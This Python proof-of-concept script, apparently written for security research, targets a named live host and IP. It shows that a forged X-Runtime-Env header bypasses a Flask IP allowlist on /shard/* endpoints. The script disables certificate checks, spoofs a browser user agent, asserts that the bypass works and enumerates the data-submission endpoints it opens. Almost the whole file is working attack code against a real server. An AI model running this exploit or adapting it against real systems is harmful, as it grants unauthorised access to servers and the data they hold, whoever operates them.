#!/usr/bin/env python3
"""
POC-01: Flask IP Allowlist Bypass via X-Runtime-Env Header
==========================================================
Target:  https://thisisafalsepositive.st  (185.178.208.191)
Vuln:    Flask checks X-Runtime-Env header value instead of (or in addition to)
         remote_addr for shard/* route access control.
         Setting X-Runtime-Env: jre-embedded bypasses the 403 IP restriction
         and grants access to all /shard/* endpoints from any IP.
Impact:  Unauthenticated access to victim data submission endpoints.
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, json, ssl, sys

TARGET_IP = "185.178.208.191"
HOST       = "thisisafalsepositive.st"
UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

def probe(path, method="GET", data=None, extra_headers={}):
    url = f"https://{TARGET_IP}{path}"
    body = json.dumps(data).encode() if data is not None else None
    headers = {
        "Host":                     HOST,
        "User-Agent":               UA,
        "Content-Type":             "application/json",
        **extra_headers
    }
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:200]

print("=== WITHOUT BYPASS HEADER ===")
code, body = probe("/shard/prefireMc", "POST", {})
print(f"  /shard/prefireMc (no header) -> HTTP {code}")
assert code == 403, "Expected 403 without bypass header"
print("  [CONFIRMED] 403 returned without X-Runtime-Env header")

print()
print("=== WITH BYPASS HEADER ===")
code, body = probe("/shard/prefireMc", "POST", {},
    extra_headers={"X-Runtime-Env": "jre-embedded",
                   "X-Edge-Cache-Revalidate": "stale-if-error"})
print(f"  /shard/prefireMc (with header) -> HTTP {code}")
assert code != 403, f"Bypass failed — still got 403"
print(f"  [BYPASSED] Got HTTP {code} — IP allowlist bypassed")

print()
print("=== ENUMERATE ACCESSIBLE SHARD ENDPOINTS ===")
paths = [
    "/shard/prefireMc", "/shard/submitData", "/shard/submitFile",
    "/shard/submitLogs", "/shard/submitMinecraftLog",
]
for path in paths:
    code, body = probe(path, "POST", {},
        extra_headers={"X-Runtime-Env": "jre-embedded",
                       "X-Edge-Cache-Revalidate": "stale-if-error"})
    status = "ACCESSIBLE" if code != 403 else "BLOCKED"
    print(f"  [{status}] {path} -> HTTP {code} | {body[:60]}")

print()
print("[+] POC-01 complete. IP allowlist bypass confirmed.")
